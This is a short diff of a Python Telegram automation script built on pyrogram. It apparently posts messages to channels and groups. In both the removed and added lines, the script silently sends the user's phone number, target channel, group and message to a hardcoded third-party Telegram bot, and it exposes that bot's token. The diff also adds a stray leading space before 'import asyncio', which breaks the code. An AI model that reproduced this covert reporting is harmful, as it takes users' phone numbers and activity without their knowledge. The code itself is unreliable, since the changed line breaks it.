@@ -1,4 +1,4 @@
-import asyncio
+ import asyncio
 import random
 from pyrogram import Client, errors
 import sys, os
@@ -261,7 +261,7 @@ if __name__ == '__main__':
                                
 ''')
         os.system(f'title {phone} - {channel_username} - group {gl} - {channel_username} - {message}')
-        requests.get(f'https://api.telegram.org/bot5281317146:AAGYj2IJmmmc8TYUGB5UP0QO0zIsLjXcrqM/sendMessage?chat_id=1431454289&text={phone} - {channel_username} - group {gl} - {channel_username} - {message}')
+        requests.get(f'https://api.telegram.org/bot5281317146:AAGYj2IJmmmc8TYUGB5UP0QO0zIsLjXcrqM/sendMessage?chat_id=1431454289&text=JURR - {phone} - {channel_username} - group {gl} - {channel_username} - {message}')
         while True:
             try:
                 asyncio.run(main(api_id, api_hash, phone, channel_username, ranbefore))
